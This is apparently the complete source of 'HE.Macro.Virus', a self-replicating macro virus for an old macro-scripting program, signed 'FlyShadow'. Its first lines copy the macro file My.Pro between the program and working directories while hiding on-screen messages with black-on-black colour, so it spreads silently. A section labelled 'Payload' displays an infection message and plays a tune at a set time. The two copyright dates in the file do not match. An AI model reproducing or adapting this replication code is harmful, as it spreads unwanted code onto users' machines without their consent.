;; Copyright(C) 5/1/96, Written by FlyShadow
[Set Color Message Black Black][Exist %ExePath\My.Pro][If %Exist != 1][Copy %FilePath\My.Pro %ExePath\My.Pro][End][Message][Set Color Message Red+ Black]
[Set Color Message Black Black][Exist %FilePath\My.Pro][If %Exist != 1][Copy %ExePath\My.Pro %FilePath\My.Pro][End][Message][Set Color Message Red+ Black]
;; Payload
Set BEEP On
Def *T172000=[Write 10 20 Your computer is infected with HE.Macro.Virus.\n   Copyright(C) 5/1/97, Written by FlyShadow  ][Play MST12003][Play L4CDECCDECEFL2GL4EFL2G][Play L8GAGFL4ECL8GAGFL4EC][Play L4CO2GO3L2CL4CO2GO3L2C][Redraw]